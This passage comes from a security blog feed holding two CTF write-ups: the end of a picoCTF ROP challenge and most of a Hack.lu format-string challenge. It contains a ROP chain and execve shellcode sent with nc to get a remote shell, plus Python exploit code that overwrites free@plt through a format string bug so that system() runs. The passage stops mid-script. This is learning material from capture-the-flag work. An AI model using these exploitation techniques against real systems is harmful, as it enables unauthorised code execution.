</span><span class='line'><span class="c"># pointer to memory region in ebx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># memory flags PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'><span class="c"># length in ecx, needs to be multiple of 2</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># eax = syscall_read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="c"># ecx = ptr to BASE</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># ebx = fd = stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="c"># edx = size of shellcode (set to 100)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># return to 0xf000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span><span class="o">(</span>python ropsploit.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> nc vuln2014.picoctf.com 4000
</span><span class='line'>yo, what<span class="err">&#39;</span>s up?
</span><span class='line'>ROP <span class="nb">time</span>!
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x    <span class="m">2</span> root     root          <span class="m">4096</span> Oct <span class="m">28</span> 17:55 .
</span><span class='line'>drwxr-xr-x    <span class="m">3</span> root     root          <span class="m">4096</span> Oct  <span class="m">5</span> 17:33 ..
</span><span class='line'>-rw-r--r--    <span class="m">1</span> root     root            <span class="m">21</span> Oct  <span class="m">5</span> 17:44 flag
</span><span class='line'>-rwxr-xr-x    <span class="m">1</span> root     root         <span class="m">11266</span> Oct  <span class="m">6</span> 01:13 hardcore_rop
</span><span class='line'>cat flag
</span><span class='line'>hard_as_PIE_amirite?
</span></code></pre></td></tr></table></div></figure>


<p>And there&rsquo;s the flag! A very fun challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu the Union Write-up]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up/"/>
    <updated>2014-10-26T16:59:19+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up</id>
    <content type="html"><![CDATA[<p>Hack.lu 2014 was a very fun, western-themed CTF. For <code>the Union</code>, we were given an executable and a place to connect to. We need to find <code>secret.txt</code> and the hint is that &ldquo;not everything is what it seems&rdquo;. Uh-huh.</p>

<!--more-->


<p><img src="http://barrebas.github.io/assets/hacklu-theunion/00.png" alt="" /></p>

<p>Upon connecting, the program asks for the union&rsquo;s slogan and secret word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc wildwildweb.fluxfingers.net 1423
</span><span class='line'>  Welcome to
</span><span class='line'> _   _                        _             _
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__   ___   _   _ _ __ <span class="o">(</span>_<span class="o">)</span> ___  _ __ <span class="o">(</span> <span class="o">)</span>___
</span><span class='line'><span class="p">|</span> __<span class="p">|</span> <span class="s1">&#39;_ \ / _ \ | | | | &#39;</span>_ <span class="se">\|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\|</span>// __<span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
</span><span class='line'> <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___/
</span><span class='line'>
</span><span class='line'>          mining archive.
</span><span class='line'>
</span><span class='line'>Please give the unions slogan and secret word:
</span></code></pre></td></tr></table></div></figure>


<p>We have neither. Time to fire up the binary in <code>gdb</code>. I also uploaded it to <a href="http://decompiler.fit.vutbr.cz/decompilation/">the Retargetable Decompiler</a>. The binary looks for a file called <code>salt.txt</code>. I made a file with only <code>0</code> as contents. Using the output of the Retargetable Decompiler, I spotted the <code>strcmp</code> that checks the user-supplied password. It looks like it checks against <code>%,(!x4!%&lt;.&gt;</code>, but I figured that it does a bit of decoding. In <code>gdb</code>, I set a breakpoint on <code>strcmp</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p strcmp
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x8048660 &lt;strcmp@plt&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x8048660
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048660
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>...snip...
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xffffd44c --&gt; 0x80489c9 <span class="o">(</span><span class="nb">test   </span>eax,eax<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xffffd450 --&gt; 0xffffd497 <span class="o">(</span><span class="s2">&quot;BLEH&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xffffd454 --&gt; 0x804c818 <span class="o">(</span><span class="s2">&quot;gold&gt;silver0\n&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xffffd458 --&gt; 0xc <span class="o">(</span><span class="s1">&#39;\x0c&#39;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xffffd45c --&gt; 0xf7fbb000 --&gt; 0x1a6da8
</span><span class='line'>0020<span class="p">|</span> 0xffffd460 --&gt; 0x4
</span><span class='line'>0024<span class="p">|</span> 0xffffd464 --&gt; 0xb <span class="o">(</span><span class="s1">&#39;\x0b&#39;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xffffd468 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048660 in strcmp@plt <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the slogan seems to be <code>gold&gt;silver</code>, and then the contents of <code>salt.txt</code> is appended. But how do we know what <code>salt.txt</code> contains on the remote server? I had another look at the output of the Decompiler, and this bit stuck out:</p>

<p><img src="http://barrebas.github.io/assets/hacklu-theunion/01.png" alt="" /></p>

<p>Only the first byte of <code>salt.txt</code> is used! This makes it easy to bruteforce it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span><span class="p">,</span> <span class="mi">1423</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;gold&gt;silver&#39;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This led us to finding that the full password is <code>gold&gt;silverb</code>. Nice! Next, we were presented with a menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to
</span><span class='line'> _   _                        _             _
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__   ___   _   _ _ __ <span class="o">(</span>_<span class="o">)</span> ___  _ __ <span class="o">(</span> <span class="o">)</span>___
</span><span class='line'><span class="p">|</span> __<span class="p">|</span> <span class="s1">&#39;_ \ / _ \ | | | | &#39;</span>_ <span class="se">\|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\|</span>// __<span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
</span><span class='line'> <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___/
</span><span class='line'>
</span><span class='line'>      mining archive.
</span><span class='line'>
</span><span class='line'>Please give the unions slogan and secret word:
</span><span class='line'>gold&gt;silverb
</span><span class='line'>Correct slogan.
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Add mine
</span><span class='line'>2<span class="o">)</span> Show mines
</span><span class='line'>3<span class="o">)</span> Delete mine
</span><span class='line'>4<span class="o">)</span> Show profit
</span><span class='line'>5<span class="o">)</span> Exit
</span></code></pre></td></tr></table></div></figure>


<p>After poking around, I found a string format exploit in the <code>Add mine</code> and <code>Show profit</code> function. This little bit shows we have control over the format string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Do you want to see the profit?
</span><span class='line'>Location: %11<span class="nv">$x</span>-%12<span class="nv">$x</span>
</span><span class='line'>Type: AABBBBCCCC
</span><span class='line'>y/n
</span><span class='line'>y
</span><span class='line'>Profit <span class="k">for</span> location:
</span><span class='line'>42424242-43434343
</span><span class='line'>AABBBBCCCC
</span><span class='line'>666
</span></code></pre></td></tr></table></div></figure>


<p>We poked around the binary a bit more and Swappage identified the secret trapdoor function at <code>0x8049208</code>. It turns out that we could reach this function also when <code>99</code> is entered on the menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>99
</span><span class='line'>Ufff! You found our trapdoor.
</span><span class='line'>Ok here you go. Everything in here is not what it seems to be.
</span><span class='line'>If you <span class="k">do</span> not understand this, you are not quite there yet.
</span></code></pre></td></tr></table></div></figure>


<p>I wrote a small python script that exploits the string format bug so that it writes the address <code>0x8049208</code> to <code>free@plt</code>. Next, the script invokes <code>Delete mine</code> so that <code>free()</code> is called, but this actually points to the trapdoor function. When executing this script locally, I noticed that <code>/bin/sh</code> threw an error message, indicating that <code>system()</code> is called somehow. But upon examination of the binary, I could not find <em>any</em> calls to <code>system()</code>, <code>execve</code> or even <code>int 0x80</code>! What was going on here? <code>hopper</code> shed some light on this function:</p>

<p><img src="http://barrebas.github.io/assets/hacklu-theunion/02.png" alt="" /></p>

<p>There is a piece of code that is never actually executed when this trapdoor function is called from the menu, the <code>printf</code>. Oddly, the rest of the binary uses <code>puts</code>. I ran <code>gdb</code> and examined the pointer that is used and compare it to <code>printf</code>&hellip; It wasn&rsquo;t the same! On a hunch, I compared it to <code>system()</code>, which did match! So indeed, not everything is what it seems. With this in mind, we can modify the string format exploit. It should write the address of <code>printf@plt</code> to <code>free@plt</code>, so when a string is freed, <code>system()</code> is called with that string as argument. Command execution, here we come!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote server</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span><span class="p">,</span> <span class="mi">1423</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive &amp; print banner</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send passphrase</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;gold&gt;silverb</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># delete all mines, makes it easier later</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add mine, supply a string format argument which</span>
</span><span class='line'><span class="c"># overwrites the first two bytes of free@plt pointer</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="c"># we need to write the value 0x85e0, which is 34272 </span>
</span><span class='line'><span class="c"># in decimal</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%34272c</span><span class="s">%11$hn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to free@plt</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;AA</span><span class="se">\x14\xb0\x04\x08</span><span class="s">CCCC</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
